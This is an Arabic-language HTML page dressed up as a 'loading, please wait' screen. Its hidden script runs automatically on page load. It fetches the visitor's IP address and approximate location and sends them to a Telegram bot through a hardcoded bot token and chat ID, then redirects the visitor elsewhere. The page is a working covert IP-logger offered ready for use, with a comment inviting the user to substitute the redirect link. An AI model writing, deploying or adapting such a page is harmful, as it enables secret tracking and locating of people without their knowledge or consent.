<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loading {
            font-size: 20px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="loading">جاري التحميل، الرجاء الانتظار...</div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const CHAT_ID = '6913353602';
        
        // دالة الحصول على IP والموقع
        async function getIPAndLocation() {
            try {
                // 1. الحصول على IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                
                // 2. الحصول على الموقع
                const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const location = await locResponse.json();
                
                return {
                    ip,
                    country: location.country_name || 'غير معروف',
                    city: location.city || 'غير معروف',
                    region: location.region || 'غير معروف'
                };
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                return {
                    ip: 'غير معروف',
                    country: 'غير معروف',
                    city: 'غير معروف',
                    region: 'غير معروف'
                };
            }
        }
        
        // دالة الإرسال إلى التليجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
            }
        }
        
        // بدء العملية عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', async () => {
            const { ip, country, city, region } = await getIPAndLocation();
            
            const message = `
                📌 <b>معلومات IP الجديدة:</b>
                ━━━━━━━━━━━━━━━━━
                • <b>IP:</b> <code>${ip}</code>
                • <b>البلد:</b> ${country}
                • <b>المدينة:</b> ${city}
                • <b>المنطقة:</b> ${region}
                ━━━━━━━━━━━━━━━━━
                ⏰ <i>${new Date().toLocaleString('ar-SA')}</i>
            `;
            
            await sendToTelegram(message);
            
            // توجيه المستخدم بعد الإرسال
            setTimeout(() => {
                window.location.href = "https://example.com"; // استبدل بالرابط المطلوب
            }, 1500);
        });
    </script>
</body>
</html>
